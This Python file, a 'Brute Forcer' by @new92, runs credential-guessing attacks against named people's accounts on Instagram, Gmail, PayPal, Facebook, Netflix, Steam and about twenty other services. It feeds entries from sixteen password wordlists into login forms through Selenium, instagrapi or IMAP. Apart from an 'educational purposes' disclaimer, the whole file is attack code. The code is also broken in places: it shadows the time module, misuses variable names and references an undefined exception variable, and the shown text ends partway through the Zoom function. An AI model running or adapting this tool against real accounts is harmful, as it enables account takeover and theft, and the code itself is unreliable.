"""
Author: @new92
Brute Forcer: Program for Brute Forcing Instagram Accounts
Please do not use it for illegal purposes !
The author is not responsible for any illegal activity/activities carried out using this program !!
The author's not responsible for any damages may be caused in the given account(s).
"""
#Imports
try:
    import time
    import platform
    from os import system
    from datetime import time
    import sniffer
    import socket
    import http
    import websockets
    import webbrowser
    import requests
    import tkinter
    import instapy
    import nmap
    import json
    import sys
    import os
    import instaloader
    import instagrapi
    import instabot
    import urllib
    import urllib3
    import re
    import scrapy
    import selenium
    import imaplib
    import art
    from art import tprint
    from selenium import webdriver
    from selenium.webdriver.support.ui import WebDriverWait
    from tkinter import messagebox
except ImportError as imp:
    print("[!] WARNING: Not all modules used in this program have been installed !")
    time.sleep(2)
    print("[+] Ignoring Warning...")
    time.sleep(1)
    if platform.system == "Windows":
        system("pip3 install -r requirements.txt")
    else:
        system("sudo pip3 install -r requirements.txt")

#Use
tkinter.messagebox.showinfo("Use !","This program has been created only for educational purposes! If this program is used for malicious purposes the author has no responsibility !")


#Logo
tprint("BRUTEFORCER",font="tarty1")

#Defs

#Display Available Attacks
def AvailAttacks():
    time.sleep(1)
    print("[1] Instagram")
    print("[2] Facebook")
    print("[3] Messenger")
    print("[4] Gmail")
    print("[5] Reddit")
    print("[6] TikTok")
    print("[7] Netflix")
    print("[8] Pinterest")
    print("[9] LinkedIn")
    print("[10] Paypal")
    print("[11] Snapchat")
    print("[12] Spotify")
    print("[13] Twitch")
    print("[14] Steam")
    print("[15] Badoo")
    print("[16] Crypto")
    print("[17] DropBox")
    print("[18] Oracle")
    print("[19] StackOverFlow")
    print("[20] IG Followers")
    print("[21] FIFA")
    print("[22] Zoom")
    print("[23] Pornhub")
    print("[24] Xhamster")

#Instagram
def Instagram():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Instagram...")
    time.sleep(2)
    username=input("[::] Please enter the Username: ")
    time.sleep(1)
    while username == None or len(username) > 30:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        username=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    username = username.lower()
    username = username.strip()
    client=instagrapi.Client()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                login = client.login(username,password)
            except Exception as e:
                continue
            if login == True:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Facebook
def Facebook():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Facebook...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.facebook.com/login")
    username = browser.find_element_by_id("email")
    password = browser.find_element_by_id("pass")
    login = browser.find_element_by_id("loginbutton")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue
#Messenger
def Messenger():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Messenger...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.messenger.com/login")
    username = browser.find_element_by_id("email")
    password = browser.find_element_by_id("pass")
    login = browser.find_element_by_id("loginbutton")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Gmail
def Gmail():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Gmail...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    server = "imap.gmail.com"
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            passworde = content
            try:
                log = imaplib.IMAP4_SSL(server)
                login == log.login(email,passworde)
            except Exception as e:
                continue
            if login == True:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if passworde not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue
#Reddit
def Reddit():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Reddit...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.reddit.com/login/")
    username = browser.find_element_by_id("loginUsername")
    password = browser.find_element_by_id("loginPassword")
    login = browser.find_element_by_class_name("AnimatedForm__submitButton m-full-width")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#TikTok
def TikTok():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for TikTok...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.tiktok.com/login/phone-or-email/email")
    username = browser.find_element_by_name("username")
    password = browser.find_element_by_class_name("tiktok-4k039c-InputContainer etcs7ny1")
    login = browser.find_element_by_class_name("e1w6iovg0 tiktok-15aypwy-Button-StyledButton ehk74z00")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Netflix
def Netflix():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Netflix...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.netflix.com/login")
    username = browser.find_element_by_id("id_userLoginId")
    password = browser.find_element_by_id("id_password")
    login = browser.find_element_by_class_name("btn login-button btn-submit btn-small")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Pinterest
def Pinterest():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Pinterest...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://pinterest.com/login")
    username = browser.find_element_by_id("email")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_class_name("zI7 iyn Hsu")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#LinkedIn
def LinkedIn():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for LinkedIn...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.linkedin.com/login")
    username = browser.find_element_by_id("email")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_class_name("btn__primary--large from__button--floating")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Paypal
def Paypal():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Paypal...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.paypal.com/signin")
    username = browser.find_element_by_id("email")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_id("btnLogin")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Snapchat
def Snapchat():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Snapchat...")
    time.sleep(2)
    umail=input("[::] Please enter the Email or the Username: ")
    time.sleep(1)
    while umail == None:
        time.sleep(1)
        print("[!] Invalid Email or Username !")
        time.sleep(1)
        umail=input("[::] Please enter again the Email or the Username: ")
    print("[!] Initiating Attack !")
    umail = umail.lower()
    umail = umail.strip()
    browser = webdriver.Firefox()
    browser.get("https://accounts.snapchat.com/accounts/login")
    username = browser.find_element_by_id("username")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_id("loginTrigger")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(umail)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Spotify
def Spotify():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Spotify...")
    time.sleep(2)
    umail=input("[::] Please enter the Email or the Username: ")
    time.sleep(1)
    while umail == None:
        time.sleep(1)
        print("[!] Invalid Email or Username !")
        time.sleep(1)
        umail=input("[::] Please enter again the Email or the Username: ")
    print("[!] Initiating Attack !")
    umail = umail.lower()
    umail = umail.strip()
    browser = webdriver.Firefox()
    browser.get("https://accounts.spotify.com/login")
    username = browser.find_element_by_id("login-username")
    password = browser.find_element_by_id("login-password")
    login = browser.find_element_by_class_name("Type__TypeElement-goli3j-0 dmuHFl sc-hKwDye eKDPqH")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(umail)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Twitch
def Twitch():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Twitch...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.twitch.tv/login")
    username = browser.find_element_by_id("login-username")
    password = browser.find_element_by_id("password-input")
    login = browser.find_element_by_class_name("Layout-sc-nxg1ff-0 OZCSg")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Steam
def Steam():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Steam...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://store.steampowered.com/login")
    username = browser.find_element_by_id("input_username")
    password = browser.find_element_by_id("input_password")
    login = browser.find_element_by_id("login_btn_signin")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Badoo
def Badoo():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Badoo...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://badoo.com/signin")
    username = browser.find_element_by_id("signin-name")
    password = browser.find_element_by_id("signin-password")
    login = browser.find_element_by_id("signin-submit")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Crypto
def Crypto():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Crypto...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://crypto.com/nft/login")
    username = browser.find_element_by_name("email")
    password = browser.find_element_by_name("password")
    login = browser.find_element_by_class_name("css-yfvlpn Button_container__K9X6Y")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#DropBox
def DropBox():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for DropBox...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.dropbox.com/login")
    username = browser.find_element_by_id("login_email4252885293303712")
    password = browser.find_element_by_id("login_password8932165565851398")
    login = browser.find_element_by_class_name("login-button signin-button button-primary")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Oracle
def Oracle():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Oracle...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://login.oracle.com/mysso/signon.jsp")
    username = browser.find_element_by_id("sso_username")
    password = browser.find_element_by_id("ssopassword")
    login = browser.find_element_by_id("signin_button")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Stackoverflow
def StackOverFlow():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Stackoverflow...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or len(email) > 30 or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        email=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    email = email.lower()
    email = email.strip()
    browser = webdriver.Firefox()
    browser.get("https://stackoverflow.com/users/login")
    username = browser.find_element_by_id("email")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_id("submit-button")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#IG Followers
def IGF():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for IG Followers...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://igfollower.net/girisyap")
    username = browser.find_element_by_id("username")
    password = browser.find_element_by_name("password")
    login = browser.find_element_by_id("login_insta")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#FIFA
def FIFA():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for FIFA...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or len(email) > 30 or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        usname=input("[::] Please enter again the Email: ")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://account.fifa.com/5a7baeb7-e706-4830-ad9f-103eba126311/oauth2/v2.0/authorize?p=b2c_1a_fifa_signuporsignin&client_id=adfd65b0-8026-4baa-ac21-db631c2139ec&response_type=code&redirect_uri=https%3A%2F%2Fwww.fifa.com%2Fapi%2Fauth&scope=adfd65b0-8026-4baa-ac21-db631c2139ec&prompt=login&response_mode=form_post&state=&ui_locales=en")
    username = browser.find_element_by_id("signInName")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_id("next")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Zoom
def Zoom():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Zoom...")
    time.sleep(2)
    email=input("[::] Please enter the Email: ")
    time.sleep(1)
    while email == None or len(email) > 30 or "@" not in email:
        time.sleep(1)
        print("[!] Invalid Email !")
        time.sleep(1)
        usname=input("[::] Please enter again the Email: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://zoom.us/signin")
    username = browser.find_element_by_id("email")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_class_name("btn btn-primary signin user")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(email)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
